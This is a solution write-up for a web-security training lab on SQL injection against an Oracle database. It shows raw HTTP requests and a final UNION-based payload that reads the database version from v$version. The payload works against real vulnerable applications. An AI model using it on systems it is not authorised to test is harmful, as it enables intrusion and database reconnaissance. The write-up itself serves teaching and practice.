---
tags:
  - injection
  - sql
---
# SQL injection attack, querying the database type and version on Oracle

## Instructions

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

??? warning "Hint"

	On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
	
	There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

## Solution

Since the vulnerability lies in the category parameter, we will focus there. 

```text title="Initial request"
GET /filter?category=Gifts HTTP/2
Host: 0aca008a03ea55be81c7531f00dc005b.web-security-academy.net
Cookie: session=vHP4Xt5RPT4TD8vzgc4yEg8biGUdELPe
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aca008a03ea55be81c7531f00dc005b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

After testing with basic UNION payloads, we find that there are two columns returned. 

The following query retrieves the database version.

```text title="Final payload"
GET /filter?category=Gifts'+UNION+SELECT+null,banner+FROM+v$version-- HTTP/2
Host: 0aca008a03ea55be81c7531f00dc005b.web-security-academy.net
Cookie: session=vHP4Xt5RPT4TD8vzgc4yEg8biGUdELPe
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aca008a03ea55be81c7531f00dc005b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

![](attachments/sqli-lab-3/file-20251124113610603.webp)
